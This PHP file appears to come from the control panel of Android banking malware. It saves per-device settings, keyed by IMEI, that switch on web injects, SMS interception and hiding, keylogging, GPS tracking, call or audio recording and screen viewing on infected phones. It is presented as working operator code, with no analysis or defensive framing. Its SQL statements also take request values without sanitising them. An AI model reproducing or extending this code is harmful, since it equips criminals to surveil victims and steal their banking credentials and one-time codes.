<?php
session_start();
$statusCode=false;
if (!(isset($_SESSION['panel_user'])))
{
	session_destroy();
	header("Location: /index.php");
}else{

	if ($_SESSION['panel_status']!="Action"){
		session_destroy();
		header("Location: /index.php");
	}else{
		$statusCode=true;
	}
}

	if($statusCode){
			 include '../../config.php';
			 $inj = "";
			 $chkhideSMS = "";

			 $num = "";
			 $sig1 = "";
			 $sig2 = "";
			 $chkinterceptSMS = "";
			 $network="";
			 $gps="";
			 $color = "";
			 $foreground = "";
			 $keylogger="";

			 $check_record = "";
			 $text_seconds = "";

			 $lookscreen = "";


			if(isset($_REQUEST["check_set"]))
			{
				$getInj = $_REQUEST["check_set"];
				$arrayInj = explode("/", $getInj);
				foreach($arrayInj as $ch)
				{
					$inj="$inj/$ch";
				}
			}

			if (isset($_REQUEST['chknetwork']))
			{
				$network = $_REQUEST['chknetwork'];
			}

			if (isset($_REQUEST['chkgps']))
			{
				$gps = $_REQUEST['chkgps'];
			}

			if (isset($_REQUEST['chkinterceptSMS']))
			{
				$chkinterceptSMS = $_REQUEST['chkinterceptSMS']; //перехват смс
			}

			if (isset($_REQUEST['chkhideSMS']))
			{
				$chkhideSMS = $_REQUEST['chkhideSMS']; //Скрытие смс
			}

			if (isset($_REQUEST['foreground']))
			{
				$foreground = $_REQUEST['foreground'];
			}

			if (isset($_REQUEST['keylogger']))
			{
				$keylogger = $_REQUEST['keylogger'];
			}

			if (isset($_REQUEST['check_record']))
			{
				$check_record = $_REQUEST['check_record'];
			}

			if (isset($_REQUEST['text_seconds']))
			{
				$text_seconds = $_REQUEST['text_seconds'];
			}

			if (isset($_REQUEST['lookscreen']))
			{
				$lookscreen = $_REQUEST['lookscreen'];
			}

			$imeis_ = $_REQUEST['text_imei_set'];
			$imeis_  = explode(':', $imeis_);

			foreach($imeis_ as $imeid)
			{
				$bool_imei="0";
				$dd="";
				if($imeid !="" )
				{
					$connection3 = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
					$connection3->exec('SET NAMES utf8');

					$sql3 = "SELECT * FROM settings";
					foreach($connection3->query($sql3) as $imei)
					{
						$imei_ = $imei['IMEI'];
						$dd = "$imei_";
						if($imei_ == $imeid)
						{

							$bool_imei="1";
							$sql3 = "UPDATE settings SET lookscreen='$lookscreen', inject = '$inj', del_sms='$chkhideSMS', state='1',  avtootvet_num='$num', avtootvet_sig1='$network', avtootvet_sig2='$gps', avtootvet_true='$chkinterceptSMS',checkforeground='$foreground',keylogger='$keylogger',checkrecord='$check_record',recordseconds='$text_seconds' WHERE IMEI='$imeid';";
							$connection3->query($sql3);

							break;
						}
					}

					if($bool_imei=="0")
					{
						$add_db_set = $connection3->exec("insert into settings (IMEI, inject, del_sms, state, avtootvet_num, avtootvet_sig1, avtootvet_sig2, avtootvet_true,checkforeground,keylogger,checkrecord,recordseconds,lookscreen)value('$imeid','$inj','$chkhideSMS','1','$num','$network','$gps','$chkinterceptSMS','$foreground','$keylogger','$check_record','$text_seconds','$lookscreen')");
					}
				}
			}
	}
?>
